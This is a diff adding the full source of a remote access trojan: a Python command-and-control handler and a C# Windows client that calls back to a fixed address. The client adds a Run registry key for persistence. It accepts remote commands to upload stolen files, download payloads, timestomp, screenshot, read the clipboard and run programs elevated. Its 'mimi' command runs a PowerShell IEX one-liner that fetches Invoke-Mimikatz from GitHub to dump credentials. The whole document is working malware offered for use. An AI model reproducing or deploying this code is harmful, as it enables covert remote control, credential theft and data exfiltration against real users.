@@ -1,0 +1,732 @@
+## serverside
+#!/usr/bin python
+
+import socket
+import os
+import datetime
+
+global host
+global port
+global s
+host = '10.0.0.1'
+port = 9999
+s = socket.socket()
+def create():
+    try:
+        global s
+        s = socket.socket()
+    except socket.error as msg:
+        print("Error: " + str(msg))
+
+
+def bind():
+    try:
+        print("Listening on port " + str(port))
+        s.bind((host, port))
+        s.listen(5)
+    except socket.error as msg:
+        print("Error: " + str(msg))
+        bind()
+
+
+def accept():
+    conn, address = s.accept()
+    print("New client connection established: IP " + address[0] + " Port: " + str(address[1]))
+    ssend(conn)
+    conn.close()
+
+def ssend(conn):
+    while True:
+        cmd = raw_input("rnrget> ")
+        args = cmd.split()
+        if len(cmd) < 1:
+            continue
+        elif cmd == 'quit' or cmd == 'exit':
+            conn.send('goodbye!')
+            conn.close()
+            s.close()
+            sys.exit()
+        elif cmd == 'clear' or cmd == 'cls':
+            os.system('clear')
+        elif cmd == '?' or cmd == '/?' or cmd == 'help' or cmd == '-h':
+            menu()
+        else:
+            conn.send(str.encode(cmd))
+            data = ''
+            while True:
+                client_response = str(conn.recv(1024))
+                data += client_response
+                print(data)
+                if len(client_response) < 1024:
+                    break
+
+def main():
+        art()
+        menu()
+        create()
+        bind()
+        accept()
+
+
+
+'''
+			elif(cmd == 'screencap'):
+				client_socket.send(cmd.encode())
+				data = b''
+				while True:
+					p = client_socket.recv(4096)
+					data += p
+					if len(p) < 4096:
+						break
+				dt = str(datetime.datetime.now())
+				filename = dt + '.jpg'
+				f = open(filename,'wb')
+				f.write(data)
+				f.close()
+				print("Operation Complete: screencap has been saved in handler directory as " + filename)
+			elif(args[0] == "getfile"):
+				client_socket.send(cmd.encode())
+				data = b''
+				while True:
+					p = client_socket.recv(4096)
+					data += p
+					if len(p) < 4096:
+						break
+				f = open(args[2],'wb')
+				f.write(data)
+				f.close()
+			else:
+				client_socket.send(cmd.encode())
+				data = b''
+				while True:
+					p = client_socket.recv(4096)
+					data += p
+					if len(p) < 4096:
+						break
+				print((data).decode('utf-8'))
+'''
+
+def menu():
+        print("Command      Description                 Format");
+        print("-------      -----------                 ------");
+        print("help         display help menu           help, /?, ?");
+        print("arch         create zip file from dir    arch <source path> <destination path>, arch C:\\Users\\srcdir C:\\Users\\dest.zip");
+        print("cp           copy files                  cp <source path> <destination path>, cp C:\\Users\\Admin\\sourcefile.txt C:\\Users\\destinationfile.txt");
+        print("del          delete files                del <target path>, del C:\\Users\\Admin\\targetfile.txt");
+        print("deldir       delete directory            deldir <target path>, deldir C:\\Users\\Admin\\Directory");
+        print("drop         drop payloads               drop <path> <URI>, dld C:\\Users\\Admin\\AppData\\Local\\Temp\\file.dld https://raw.githubusercontent.com/rnranalysis/file.dld");
+        print("envar        get environmental vars      envar");
+        print("enumdir      enumerate files             enumdir <target dir>, enumdir C:\\Users\\Admin\\Desktop");
+        print("getfile      grab files                  getfile <target path> <local download path>, getfile C:\\Users\\Admin\\passwords.txt /usr/root/Desktop/passwords.txt");
+        print("grep         case sensisitive grep       grep <pattern> <path>, grep foo bar.txt");
+        print("hostinfo     get host information        hostinfo");
+        print("keylog       log key strokes             keylog");
+        print("mimi         invoke-mimikatz             mimi");
+        print("mv           move files                  mv <source> <destination>, mv C:\\Users\\Admin\\source.file C:\\Users\\Admin\\Desktop\\dest.file");
+        print("mkdir        create directory            mkdir <target dir>, mkdir C:\\Users\\Admin\\NewDir");
+        print("persist      pick yo persistence         persist logonscript or startup or schtask");
+        print("ps           get process listing         ps");
+        print("pwd          print working directory     pwd");
+        print("cat          read text from file         cat <target path>, cat C:\\Users\\Admin\\helloworld.txt");
+        print("run          run processes               run <target path>, run calc.exe");
+        print("runadmin     run processes as admin      runadmin <target path>, runadmin calc.exe");
+        print("screencap    take screenshot             screencap <save path>, screencap C:\\Users\\REM\\Desktop\\screencap.bmp");
+        print("shares       enumerate shares            shares");
+        print("ts           timestomp                   ts <target path>, ts C:\\Users\\Admin\\AppData\\Local\\Temp\\targetfile.bin");
+        print("userinfo     get user information        userinfo");
+        print("xfil         exfil files                 xfil <target path> <URI>, xfil C:\\Users\\Admin\\xfil.me, https://raw.githubusercontent.com/rnranalysis/xfiol.file")
+
+
+def art():
+    print("                                                     __     ");
+    print("                                                    /  |    ");
+    print("  ______   _______    ______    ______    ______   _$$ |_   ");
+    print(" /      \\ /       \\  /      \\  /      \\  /      \\ / $$   | ");
+    print("/$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |/$$$$$$  |$$$$$$/   ");
+    print("$$ |  $$/ $$ |  $$ |$$ |  $$/ $$ |  $$ |$$    $$ |  $$ | __ ");
+    print("$$ |      $$ |  $$ |$$ |      $$ \\__$$ |$$$$$$$$/   $$ |/  |");
+    print("$$ |      $$ |  $$ |$$ |      $$    $$ |$$       |  $$  $$/ ");
+    print("$$/       $$/   $$/ $$/        $$$$$$$ | $$$$$$$/    $$$$/  ");
+    print("                              /  \\__$$ |                    ");
+    print("                              $$    $$/                     ");
+    print("                               $$$$$$/                      ");
+
+main()
+
+
+#### client side
+using System;
+using System.Text;
+using System.IO;
+using System.Diagnostics;
+using System.ComponentModel;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Management;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Windows.Forms;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Collections;
+using Microsoft.Win32;
+using System.Collections.Generic;
+//using Microsoft.Win32.TaskScheduler;
+
+namespace rnrclient
+{
+    public class Program
+    {
+        static string server = "10.0.0.1";
+        static Int32 port = 9999;
+        static TcpClient client = new TcpClient(server, port);
+
+        public static void Main()
+        {
+            runkey();
+            connect();
+            Console.WriteLine("Press any key to continue: ");
+            Console.ReadKey();
+        }
+        static void send(string s)
+        {
+            NetworkStream stream = client.GetStream();
+            byte[] send = System.Text.Encoding.ASCII.GetBytes(s);
+            stream.Write(send, 0, send.Length);
+        }
+        static void sendfile(string path)
+        {
+            NetworkStream stream = client.GetStream();
+            byte[] file = System.IO.File.ReadAllBytes(path);
+            stream.Write(file, 0, file.Length);
+        }
+        static void connect()
+        {
+            try
+            {
+                while (true)
+                {
+                    NetworkStream stream = client.GetStream();
+                    Byte[] data = new Byte[1024];
+                    String responseData = String.Empty;
+                    Int32 bytes = stream.Read(data, 0, data.Length);
+                    responseData = System.Text.Encoding.ASCII.GetString(data, 0, bytes);
+                    Console.WriteLine("Received: {0}", responseData);
+                    string[] args = responseData.Split();
+                    if (args[0] == "hostinfo")
+                    {
+                        send(hostinfo());
+                    }
+                    else if (args[0] == "userinfo")
+                    {
+                        send(userinfo());
+                    }
+                    else if (args[0] == "help")
+                    {
+                        send(help());
+                    }
+                    else if (args[0] == "shares")
+                    {
+                        send(shares());
+                    }
+                    else if (args[0] == "ps")
+                    {
+                        send(ps());
+                    }
+                    else if (args[0] == "envar")
+                    {
+                        send(envar());
+                    }
+                    else if (args[0] == "dld")
+                    {
+                        if (args.Length != 3)
+                        {
+                            send("Requires 2 arguments!");
+                        }
+                        else
+                        {
+                            send(dld(args[1], args[2]));
+                        }
+
+                    }
+                    else if (args[0] == "xfil")
+                    {
+                        xfil(args[1], args[2]);
+                    }
+                    else if (args[0] == "ts")
+                    {
+                        ts(args[1]);
+                    }
+                    else if (args[0] == "enumdir")
+                    {
+                        if (args.Length != 2)
+                        {
+                            send("Requires 1 argument!");
+                        }
+                        else
+                        {
+                            send(enumdir(args[1]));
+                        }
+                    }
+                    else if (args[0] == "pwd")
+                    {
+                        send(pwd());
+                    }
+                    else if (args[0] == "mkdir")
+                    {
+                        send(mkdir(args[1]));
+                    }
+                    else if (args[0] == "mv")
+                    {
+                        string yy = mv(args[1], args[2]);
+                        send(yy);
+                    }
+                    else if (args[0] == "cp")
+                    {
+                        cp(args[1], args[2]);
+                    }
+                    else if (args[0] == "del")
+                    {
+                        del(args[1]);
+                    }
+                    else if (args[0] == "run")
+                    {
+                        if (args.Length != 2)
+                        {
+                            send("Requires 2 arguments!");
+                        }
+                        else
+                        {
+                            send(run(args[1]));
+                        }
+                        
+                    }
+                    else if (args[0] == "runadmin")
+                    {
+                        if (args.Length != 2)
+                        {
+                            send("Requires one argument!");
+                        }
+                        else
+                        {
+                            runadmin(args[1]); // fix this function
+                        }
+                    }
+                    else if (args[0] == "arch")
+                    {
+                        if (args.Length != 3)
+                        {
+                            send("Requires 2 arguments!");
+                        }
+                        else
+                        {
+                            send(arch(args[1], args[2]));
+                        }
+                    }
+                    else if (args[0] == "screencap")
+                    {
+                        string path = screencap(args[1]);
+                        sendfile(path);
+                    }
+                    else if (args[0] == "sendfile")
+                    {
+                        sendfile(args[1]);
+                    }
+                    else if (args[0] == "persist")
+                    {
+                        //persist();
+                    }
+                    else if (args[0] == "mimi")
+                    {
+                        mimikatz();
+                    }
+                    else if (args[0] == "cat")
+                    {
+                        send(cat(args[1]));
+                    }
+                    else if (args[0] == "clip")
+                    {
+                        send(clip());
+                    }
+                    else if (args[0] == "exit")
+                    {
+                        stream.Close();
+                        client.Close();
+                        return;
+                    }
+                    else
+                    {
+                        send("Command not recognized....\n");
+                    }
+                }
+            }
+            catch (ArgumentNullException e)
+            {
+                Console.WriteLine("ArgumentNullException: " + e);
+            }
+            catch (SocketException e)
+            {
+                Console.WriteLine("SocketException: " + e);
+            }
+        }
+        static string hostinfo()
+        {
+            try
+            {
+            string hostName = Dns.GetHostName();
+            string ip = Dns.GetHostByName(hostName).AddressList[0].ToString();
+            StringBuilder response = new StringBuilder();
+            response.Append("IP: " + ip);
+            response.Append("\nHostname: " + System.Environment.MachineName);
+            response.Append("\nMAC: ");
+            string Query2 = "SELECT * FROM win32_networkadapterconfiguration";
+            ManagementObjectSearcher searcher2 = new ManagementObjectSearcher(Query2);
+            var mac = "";
+            foreach (ManagementObject nic in searcher2.Get())
+            {
+                mac += Convert.ToString(nic.Properties["MACAddress"].Value);
+                if (mac.Length <= 17 && mac.Length != 0)
+                {
+                    response.AppendLine(mac);
+                }
+
+            }
+            response.Append("\nProcessor Count: " + System.Environment.ProcessorCount);
+            response.Append("\n64-bit: " + System.Environment.Is64BitOperatingSystem);
+            response.Append("\nLogical Drive: " + Environment.GetLogicalDrives());
+            string Query = "SELECT Capacity FROM Win32_PhysicalMemory";
+            ManagementObjectSearcher searcher = new ManagementObjectSearcher(Query);
+            UInt64 Capacity = 0;
+            foreach (ManagementObject WniPART in searcher.Get())
+            {
+                Capacity += Convert.ToUInt64(WniPART.Properties["Capacity"].Value);
+            }
+            response.Append("\nTotal RAM: " + Capacity);
+            response.Append("\n");
+            return response.ToString();
+            }
+            catch (Exception e)
+            {
+                return "Failed to find host information!";
+            }
+        }
+        static string userinfo()
+        {
+            try
+            { 
+            StringBuilder response = new StringBuilder();
+            response.Append("Username: " + Environment.UserName);
+            response.Append("\nDomain\\Username: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name);
+            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
+            {
+                WindowsPrincipal principal = new WindowsPrincipal(identity);
+                var admin = principal.IsInRole(WindowsBuiltInRole.Administrator);
+                response.Append("\nAdmin: " + admin);
+            }
+            response.Append("\n");
+            return response.ToString();
+            }
+            catch (Exception e)
+            {
+                return "Failed to pull user information!";
+            }
+        }
+        static string shares()
+        {
+            try
+            {
+                StringBuilder response = new StringBuilder();
+                var wmiPath = string.Format(@"\\{0}\root\cimv2", System.Environment.MachineName);
+                var wql = "select * FROM Win32_Share";
+                var searcher = new ManagementObjectSearcher(wmiPath, wql);
+                var shares = searcher.Get();
+                response.Append("\nShares:");
+                foreach (var share in shares)
+                {
+                    response.Append("\n{0}" + share);
+                }
+                var wql2 = "select * FROM Win32_MappedLogicalDisk";
+                var searcher2 = new ManagementObjectSearcher(wmiPath, wql2);
+                var netShares = searcher2.Get();
+                if (netShares is null)
+                {
+                    response.Append("\nNo Mapped Drives!");
+                }
+                else
+                {
+                    response.Append("\nMapped Drives:\n");
+                    foreach (var share2 in netShares)
+                    {
+                        response.Append("\n{0}");
+                    }
+                }
+                return response.ToString();
+            }
+            catch (Exception e)
+            {
+                return "Failed to enumerate shares!";
+            }
+        }
+        static string ps()
+        {
+            StringBuilder allProcesses = new StringBuilder();
+            allProcesses.Append(String.Format("Handles {0,7} {1,-40}\n", "Id", "ProcessName"));
+            Process[] processList = Process.GetProcesses();
+            foreach (Process process in processList)
+            {
+                string processInfo = String.Format("{0,7} {1,7} {2,-40}\n", process.HandleCount, process.Id, process.ProcessName);
+                allProcesses.Append(processInfo);
+            }
+            return allProcesses.ToString();
+        }
+        static string envar()
+        {
+            StringBuilder response = new StringBuilder();
+            var envar = Environment.GetEnvironmentVariables();
+            foreach (DictionaryEntry i in envar)
+            {
+                response.Append(i.Key + ": " + i.Value + "\n");
+            }
+            return response.ToString();
+        }
+        static string dld(string path, string uri)
+        {
+            try
+            {
+                var wc = new System.Net.WebClient();
+                wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
+                Uri u = new Uri(uri);
+                wc.DownloadFile(u, path);
+                return "Download successful.";
+            }
+            catch (Exception e)
+            {
+                return "Download failed!";
+            }
+        }
+        static string xfil(string path, string uri)
+        {
+            try
+            {
+            var wc = new System.Net.WebClient();
+            Uri u = new Uri(uri);
+            wc.Headers.Add("user-agent", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)");
+            wc.UploadFile(u, path);
+            return "Exfil succesul.";
+            }
+            catch (Exception e)
+            {
+                return "Exfil failed!";
+            }
+        }
+        static string ts(string path)
+        {
+            try
+            {
+                System.IO.File.SetCreationTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe"));
+                System.IO.File.SetLastAccessTime(path, System.IO.File.GetCreationTime("C:\\Windows\\System32\\notepad.exe")); // appear not to be accessed since machine was built
+                System.IO.File.SetLastWriteTime(path, System.IO.File.GetLastWriteTime("C:\\Windows\\System32\\notepad.exe"));
+                return "Successfully timestomped: " + path;
+            }
+            catch (Exception e)
+            {
+                return "Failed to timestomp!";
+            }
+        }
+        static string enumdir(string path)
+        {
+            try
+            {
+                var files = System.IO.Directory.EnumerateFiles(path);
+                var f = "";
+                foreach (string file in files)
+                {
+                    f += "\n" + file;
+                }
+                var directories = System.IO.Directory.EnumerateDirectories(path);
+                foreach (string directory in directories)
+                {
+                    f += "\n" + directory;
+                }
+                var list = f.Split();
+                List<string> result = f.Split('\n').ToList();
+                result.Sort();
+                StringBuilder response = new StringBuilder();
+                foreach (var item in result)
+                {
+                    response.Append(item + "\n");
+                }
+                return response.ToString();
+            }
+            catch (Exception e)
+            {
+                return "Failed to enumerate directory " + path;
+            }
+        }
+        static string pwd()
+        {
+            try
+            {
+                return Environment.CurrentDirectory;
+            }
+            catch (Exception e)
+            {
+                return "Failed to get current working directory!";
+            }
+        }
+        static string mkdir(string dir)
+        {
+            try
+            {
+                System.IO.Directory.CreateDirectory(dir);
+                return "Successfully created: " + dir;
+            }
+            catch (Exception e)
+            {
+                return "Failed to create directory " + dir;
+            }
+        }
+        static string mv(string src, string dest)
+        {
+            try
+            {
+                System.IO.File.Move(src, dest);
+                return "Successfully moved " + src + " to " + dest;
+            }
+            catch (Exception e)
+            {
+                return "Failed to move file!" + e;
+            }
+        }
+        static string cp(string src, string dest)
+        {
+            try
+            {
+                System.IO.File.Copy(src, dest);
+                return "Successfully copied file.";
+            }
+            catch (Exception e)
+            {
+                return "Failed to copy file!";
+            }
+        }
+        static void del(string path)
+        {
+            System.IO.File.Delete(path);
+        }
+        static string arch(string src, string dest)
+        {
+            try
+            {
+                System.IO.Compression.ZipFile.CreateFromDirectory(src, dest);
+                return dest + " successfully created!";
+            }
+            catch (Exception e)
+            {
+                return "Failed to create archive!";
+            }
+        }
+        static string cat(string path)
+        {
+            try
+            {
+                return System.IO.File.ReadAllText(path);
+            }
+            catch (Exception e)
+            {
+                return "File not found!:";
+            }
+        }
+        static string screencap(string dest)
+        {
+            try
+            {
+                Bitmap screencap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+                Graphics graphics = Graphics.FromImage(screencap as Image);
+                graphics.CopyFromScreen(0, 0, 0, 0, screencap.Size);
+                screencap.Save(dest, ImageFormat.Jpeg);
+                return dest;
+            }
+            catch (Exception e)
+            {
+                return "Failed to capture screen!";
+            }
+        }
+        static string run(string proc)
+        {
+            try
+            {
+                Process.Start(proc);
+                return proc + " successfully started.";
+            }
+            catch (Exception e)
+            {
+                return "Failed to start process!";
+            }
+        }
+        private static bool runadmin(string proc)
+        {
+            var SelfProc = new ProcessStartInfo
+            {
+                UseShellExecute = true,
+                WorkingDirectory = Environment.CurrentDirectory,
+                FileName = proc,
+                Verb = "runas",
+            };
+            try
+            {
+                Process.Start(SelfProc);
+                return true;
+            }
+            catch
+            {
+                Console.WriteLine("Insufficient privs.....");
+                return false;
+            }
+        }
+        static string runkey()
+        {
+            try
+            {
+                var split = Environment.CommandLine.Split();
+                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "rnrget", split[0]);
+                return "Successfully created regitstry entry.";
+            }
+            catch (Exception e)
+            {
+                return "Failed to create registry entry!";
+            }
+        }
+        static void persist(string type)
+        {
+            var split = Environment.CommandLine.Split();
+            var path = split[0];
+            if (type == "logonscript")
+            {
+                Registry.SetValue("HKEY_CURRENT_USER\\Environment\\UserInitMprLogonScript", "rnrget", path);
+            }
+            else if (type == "startup")
+            {
+                System.IO.File.Copy(path, "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\rnrget.exe");
+            }
+            else if (type == "schtask")
+            {
+                //
+            }
+
+        }
+        static void mimikatz()
+        {
+            string args = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); $m = Invoke-Mimikatz -DumpCreds; $m";
+            ProcessStartInfo psinfo = new ProcessStartInfo("powershell.exe");
+            psinfo.WindowStyle = ProcessWindowStyle.Normal;
+            psinfo.Arguments = args;
+            Process.Start(psinfo);
+        }
+        static string clip()
+        {
+            return System.Windows.Forms.Clipboard.GetText();
+        }
+    }
+}
